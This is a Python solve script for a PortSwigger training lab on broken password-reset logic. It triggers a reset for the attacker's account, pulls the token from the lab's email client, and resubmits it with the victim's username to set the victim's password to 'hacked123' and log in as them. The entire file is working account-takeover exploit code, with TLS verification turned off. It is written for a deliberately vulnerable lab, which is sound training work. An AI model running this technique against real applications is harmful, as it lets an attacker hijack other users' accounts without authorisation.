#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Password reset broken logic.

Triggers a reset for wiener, extracts token from /email, then resets
carlos's password by substituting the username in the final POST.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

NEW_PASSWORD = "hacked123"


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def trigger_reset(session: requests.Session, lab: str, username: str) -> None:
    csrf = get_csrf(session, f"{lab}/forgot-password")
    session.post(f"{lab}/forgot-password", data={"csrf": csrf, "username": username})
    print(f"[*] Reset triggered for {username}")


def get_reset_token(session: requests.Session, lab: str) -> str:
    r = session.get(f"{lab}/email")
    m = re.search(r"temp-forgot-password-token=([a-zA-Z0-9]+)", r.text)
    if not m:
        raise SystemExit("[-] Reset token not found in email client")
    token = m.group(1)
    print(f"[*] Token: {token}")
    return token


def reset_password(session: requests.Session, lab: str, token: str, target: str, new_password: str) -> None:
    csrf = get_csrf(session, f"{lab}/forgot-password?temp-forgot-password-token={token}")
    r = session.post(
        f"{lab}/forgot-password",
        params={"temp-forgot-password-token": token},
        data={
            "csrf": csrf,
            "temp-forgot-password-token": token,
            "username": target,
            "new-password-1": new_password,
            "new-password-2": new_password,
        }
    )
    print(f"[*] Reset POST status: {r.status_code}")


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 3 (password reset broken logic)")
    parser.add_argument("lab_url")
    parser.add_argument("--attacker", default="wiener")
    parser.add_argument("--target", default="carlos")
    parser.add_argument("--new-password", default=NEW_PASSWORD)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    trigger_reset(s, lab, args.attacker)
    token = get_reset_token(s, lab)
    reset_password(s, lab, token, args.target, args.new_password)

    csrf = get_csrf(s, f"{lab}/login")
    r = s.post(f"{lab}/login", data={"csrf": csrf, "username": args.target, "password": args.new_password})
    print(f"[*] Login as {args.target} status: {r.status_code}")
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
